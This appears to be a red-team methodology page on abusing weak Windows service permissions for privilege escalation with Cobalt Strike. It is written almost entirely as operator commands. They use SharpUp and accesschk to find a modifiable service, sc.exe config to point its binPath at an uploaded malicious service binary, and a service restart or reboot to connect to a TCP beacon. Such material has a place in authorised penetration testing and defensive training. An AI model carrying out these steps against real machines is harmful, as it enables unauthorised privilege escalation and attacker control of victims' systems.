---
title: "Weak Service Permissions Abuse Methodology"
author: "nickvourd"
description: "Abuse Windows service misconfigurations that allow an attacker to elevate their privileges."
date: 2022-02-01
---

### Abuse Windows service misconfigurations that allow an attacker to elevate their privileges.

---

#### -> Run SharpUp and find that a Service is Modifiable (Beacon Command):

```powershell
$ execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
```

#### -> Find Service Permisions with accesschk from Sysinternals Suite (Beacon Command):

```powershell
$ powershell .\accesschk64.exe /accepteula -ucqv [user] [service_name]
```

#### ->  We can abuse these weak permissions by changing the binary path of the service - so instead of it running `C:\[path]\[real_service].exe`, we can have it run something like `C:\[path]\[fake_service].exe`.

#### -> Payloads to abuse services must be specific "service binaries". We can do this in Cobalt Strike via `Attacks > Packages > Windows Executable (S)` and selecting the Service Binary output type.

#### -> Upload the malicious payload to a writable directory.

#### -> Rename the malicious payload to `fake-service.exe`.

#### ->View the configurations of service (Beacon Command):
```powershell
$ powershell sc.exe qc [service_name]
```

#### -> Change the binary path of service (Beacon Command):
```powershell
$ powershell sc.exe config [service_name] binPath= C:\[path]\fake-service.exe
```

#### ->Verify the configurations of service (Beacon Command):
```powershell
$ powershell sc.exe qc [service_name]
```

#### -> View state of service (Beacon Command):
```powershell
$ powershell sc.exe query [service_name]
```

#### -> If the service is running and you have permissions to stop it (Beacon Command):
```powershell
$ powershell sc.exe stop [service_name]
```

* Then start again the service (Beacon Command):
```powershell
$ powershell sc.exe start [service_name]
```

* Connect to the listening tcp beacon (Command Beacon):
```powershell
$ connect localhost [port]
```

#### -> If you don't have permissions to start/stop the victim's vulnerable service, just reboot the victim's machine and connect to TCP Beacon.

---

###### nickvourd's Social links
- [[GitHub]](https://github.com/nickvourd)
- [[Twitter]](https://twitter.com/nickvourd)